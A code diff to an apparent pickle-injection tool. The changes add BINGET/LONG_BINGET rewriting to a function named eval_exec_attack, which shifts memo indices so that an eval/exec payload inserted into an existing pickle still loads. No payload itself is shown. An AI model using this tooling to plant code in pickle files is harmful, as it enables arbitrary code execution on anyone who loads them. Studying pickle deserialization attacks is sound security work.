@@ -1,15 +1,12 @@
-from http.client import NETWORK_AUTHENTICATION_REQUIRED
-import pickle
 import struct
 from pickletools import genops
 from pickletools import opcodes as opcode_library
-from sys import byteorder
-from turtle import position
-import debug
 
 BINUNICODE = 21
 TUPLE1 = 31
 POP = 41
+BINGET = 46
+LONG_BINGET = 47
 BINPUT = 49
 LONG_BINPUT = 50
 GLOBAL = 55
@@ -24,15 +21,19 @@ def get_all_commands(in_pickle):
     args = []
     positions = []
 
-    for _, k in enumerate(__builtins__):
-        print(k)
-
     for opcode, arg, pos in genops(in_pickle):
         opcodes.append(opcode)
         args.append(arg)
         positions.append(pos)
 
     return opcodes, args, positions
+
+def write_get(memo_index, out_file):
+    memo_opcode = BINGET if memo_index <= BYTE_MAX else LONG_BINGET
+    byte_length = 1 if memo_index <= BYTE_MAX else 4
+    
+    out_file.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
+    out_file.write(memo_index.to_bytes(byte_length, byteorder="little"))
 
 def write_memo(memo_index, out_file):
     memo_opcode = BINPUT if memo_index <= BYTE_MAX else LONG_BINPUT
@@ -116,16 +117,21 @@ def eval_exec_attack(in_pickle, attack_str, attack_index, out_file):
         rem_pos = pos[attack_index:]
 
         for i in range(len(rem_opcodes)):
-            opcode_not_memo = rem_opcodes[i].name != "BINPUT" and rem_opcodes[i].name != "LONG_BINPUT"
-            if opcode_not_memo:
-                # If this opcode is not memoization, just copy data from pickle file
+            opcode_is_memo = rem_opcodes[i].name == "BINPUT" or rem_opcodes[i].name == "LONG_BINPUT"
+            opcode_is_get = rem_opcodes[i].name == "BINGET" or rem_opcodes[i].name == "LONG_BINGET"
+
+            if opcode_is_get and rem_args[i] > last_memo_index:
+                # Rewrite get
+                write_get(rem_args[i] + EVAL_EXEC_MEMO_LEN, out_pickle)
+            elif opcode_is_memo:
+                # Rewrite memo
+                write_memo(rem_args[i] + EVAL_EXEC_MEMO_LEN, out_pickle)
+            else:
+                # If this opcode is not special, just copy data from pickle file
                 in_pickle.seek(rem_pos[i])
 
                 bytes_read = rem_pos[i + 1] - rem_pos[i] if i != len(rem_opcodes) - 1 else -1
                 out_pickle.write(in_pickle.read(bytes_read))
-            else:
-                # Otherwise, rewrite memo
-                write_memo(rem_args[i] + EVAL_EXEC_MEMO_LEN, out_pickle)
     else:
         # Trivial case: no memoization, no modification
         in_pickle.seek(attack_pos)
